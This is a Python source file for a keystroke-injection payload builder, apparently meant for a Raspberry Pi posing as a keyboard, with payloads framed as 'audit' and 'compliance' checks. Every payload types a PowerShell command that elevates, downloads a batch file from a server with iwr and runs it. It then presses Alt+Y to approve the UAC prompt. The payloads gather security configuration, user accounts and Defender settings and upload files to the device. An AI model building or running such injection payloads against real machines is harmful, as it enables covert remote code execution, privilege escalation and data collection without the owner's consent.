
"""
Payload builder for generating HID injection scripts.
Supports dynamic templates with variable substitution.
"""

from datetime import datetime
import json


class PayloadBuilder:
    """Builds executable HID payloads from templates"""
    
    def __init__(self, config_path='config.json'):
        self.payloads = {}
        self.config = self._load_config(config_path)
        self._register_default_payloads()

    def _load_config(self, config_path):
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            # Fallback to default if config is missing or invalid
            return {
                "network": {
                    "server_ip": "172.16.0.1",
                    "upload_port": 8000
                }
            }
    
    def _get_bat_payload_commands(self, bat_filename):
        return [
            {'action': 'combo', 'keys': ['WIN', 'r']},
            {'action': 'delay', 'ms': 500},
            {'action': 'type', 'text': f'powershell -c "Start-Process powershell -Verb runAs -ArgumentList \'-nop -c iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -OutFile $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat\'"'},
            {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
            {'action': 'delay', 'ms': 6000},
            {'action': 'combo', 'keys': ['ALT', 'y']},
        ]

    def _register_default_payloads(self):
        """Register built-in payload templates"""
        
        # System info collector
        self.payloads['sysinfo'] = {
            'name': 'Get System Info',
            'description': 'Basic details like Hostname, OS version, etc.',
            'commands': self._get_bat_payload_commands('sysinfo.bat')
        }
        
        # Compliance check payload
        self.payloads['compliance'] = {
            'name': 'Run Compliance Check',
            'description': 'Checks if the PC meets basic security standards.',
            'commands': self._get_bat_payload_commands('compliance.bat')
        }
        
        # Simple test payload
        self.payloads['test'] = {
            'name': 'Test Connection',
            'description': 'Opens notepad to see if the HID injection works.',
            'commands': self._get_bat_payload_commands('test.bat')
        }
        
        # Registry export - Policies (Works on Home)
        self.payloads['export_policies'] = {
            'name': 'Get Computer Policies',
            'description': 'Downloads machine-level registry policies.',
            'commands': self._get_bat_payload_commands('export_policies.bat')
        }
        
        self.payloads['export_user_policies'] = {
            'name': 'Get User Policies',
            'description': 'Downloads user-level registry policies.',
            'commands': self._get_bat_payload_commands('export_user_policies.bat')
        }
        
        # Registry export - Services (Works on Home)
        self.payloads['export_services'] = {
            'name': 'Get Running Services',
            'description': 'Lists all background services.',
            'commands': self._get_bat_payload_commands('export_services.bat')
        }
        
        # Registry export - Control (Works on Home)
        self.payloads['export_control'] = {
            'name': 'Get System Control Config',
            'description': 'Downloads control settings from the registry.',
            'commands': self._get_bat_payload_commands('export_control.bat')
        }
        
        # Firewall export (Works on Home)
        self.payloads['export_firewall'] = {
            'name': 'Get Firewall Rules',
            'description': 'Lists all Windows Firewall rules.',
            'commands': self._get_bat_payload_commands('export_firewall.bat')
        }
        
        # Defender settings (Works on Home)
        self.payloads['export_defender'] = {
            'name': 'Get Antivirus Settings',
            'description': 'Downloads Windows Defender configuration.',
            'commands': self._get_bat_payload_commands('export_defender.bat')
        }
        
        # Driver enumeration (Works on Home)
        self.payloads['export_drivers'] = {
            'name': 'Get Installed Drivers',
            'description': 'Lists all installed drivers.',
            'commands': self._get_bat_payload_commands('export_drivers.bat')
        }
        
        # Device enumeration (Works on Home)
        self.payloads['export_devices'] = {
            'name': 'Get Connected Devices',
            'description': 'Lists all attached hardware components.',
            'commands': self._get_bat_payload_commands('export_devices.bat')
        }
        
        # Combined audit (All Home-compatible commands)
        self.payloads['full_audit'] = {
            'name': 'Quick Audit (Home Edition)',
            'description': 'Runs a basic scan for Windows Home devices.',
            'commands': self._get_bat_payload_commands('full_audit.bat')
        }

        # Combined audit PRO (All exports including Pro features)
        self.payloads['full_audit_pro'] = {
            'name': 'Deep Audit (Pro Edition)',
            'description': 'Runs a thorough scan for Windows Pro/Enterprise.',
            'commands': self._get_bat_payload_commands('full_audit_pro.bat')
        }
        


        # GPResult Computer
        self.payloads['export_gpresult_computer'] = {
            'name': 'Get GPResult (Computer)',
            'description': 'Downloads the applied Group Policy report for the PC.',
            'commands': self._get_bat_payload_commands('export_gpresult_computer.bat')
        }

        # GPResult User
        self.payloads['export_gpresult_user'] = {
            'name': 'Get GPResult (User)',
            'description': 'Downloads the applied Group Policy report for the user.',
            'commands': self._get_bat_payload_commands('export_gpresult_user.bat')
        }

        # Secedit - account policies, user rights, security options
        self.payloads['export_secedit'] = {
            'name': 'Get Security Rights',
            'description': 'Checks local policies and user rights.',
            'commands': self._get_bat_payload_commands('export_secedit.bat')
        }

        # Auditpol - advanced audit policy categories
        self.payloads['export_auditpol'] = {
            'name': 'Get Audit Logging Config',
            'description': 'Checks what events Windows is logging.',
            'commands': self._get_bat_payload_commands('export_auditpol.bat')
        }

        # Net user - local user accounts and restrictions
        self.payloads['export_net_users'] = {
            'name': 'Get Local Users',
            'description': 'Lists local accounts and password rules.',
            'commands': self._get_bat_payload_commands('export_net_users.bat')
        }

        # Group Policy cache - applied GPO GUIDs and cached settings
        self.payloads['export_gp_cache'] = {
            'name': 'Get Group Policy Cache',
            'description': 'Finds leftover Group Policy files.',
            'commands': self._get_bat_payload_commands('export_gp_cache.bat')
        }

        # Upload audit files to Pi
        self.payloads['upload_files'] = {
            'name': 'Sync Offline Files',
            'description': 'Uploads leftover logs if a previous scan failed.',
            'commands': self._get_bat_payload_commands('upload_files.bat')
        }
    
    def get_payload(self, name, variables=None):
        """
        Get payload by name with variable substitution.
        
        Args:
            name: Payload name
            variables: Dict of variables to substitute
        
        Returns:
            List of commands with substituted variables
        """
        if name not in self.payloads:
            raise ValueError(f"Payload '{name}' not found")
        
        payload = self.payloads[name].copy()
        commands = payload['commands']
        
        # Default variables
        default_vars = {
            'TIMESTAMP': datetime.now().isoformat(),
            'HOST_ID': 'unknown',
            'SERVER_IP': self.config['network']['server_ip'],
            'UPLOAD_PORT': self.config['network']['upload_port']
        }
        
        # Merge with provided variables
        if variables:
            default_vars.update(variables)
        
        # Substitute variables in commands
        substituted = []
        for cmd in commands:
            new_cmd = cmd.copy()
            if 'text' in new_cmd:
                text = new_cmd['text']
                for var, value in default_vars.items():
                    text = text.replace(f'{{{{{var}}}}}', str(value))
                new_cmd['text'] = text
            substituted.append(new_cmd)
        
        return substituted
    
    def list_payloads(self):
        """List all available payloads"""
        return {
            name: {
                'name': payload['name'],
                'description': payload['description']
            }
            for name, payload in self.payloads.items()
        }
    
    def add_custom_payload(self, name, description, commands):
        """
        Add a custom payload.
        
        Args:
            name: Unique payload identifier
            description: Human-readable description
            commands: List of command dictionaries
        """
        self.payloads[name] = {
            'name': name,
            'description': description,
            'commands': commands
        }
